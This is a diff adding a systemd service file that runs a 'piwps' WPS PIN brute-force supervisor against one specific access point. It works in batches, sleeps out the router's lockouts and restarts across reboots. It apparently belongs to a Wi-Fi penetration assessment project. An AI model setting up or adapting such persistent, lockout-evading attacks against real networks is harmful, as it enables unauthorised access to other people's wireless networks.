@@ -1,0 +1,15 @@
+[Unit]
+Description=Pi persistent WPS supervisor (resume across reboots, lockout backoff)
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/paras/wifi-penetration-assessment
+ExecStartPre=/usr/bin/python3 -m piwps setup-radio
+ExecStart=/usr/bin/python3 -m piwps wpsd --bssid b4:86:18:86:cc:b3 --ssid 2.4G_B1 --out /home/paras/wifi-penetration-assessment/results-wps-persist --pins corpus --seed-file /home/paras/wifi-penetration-assessment/words/wps-tested.txt --batch 25 --gap 10 --lockout-sleep 2700
+Restart=on-failure
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
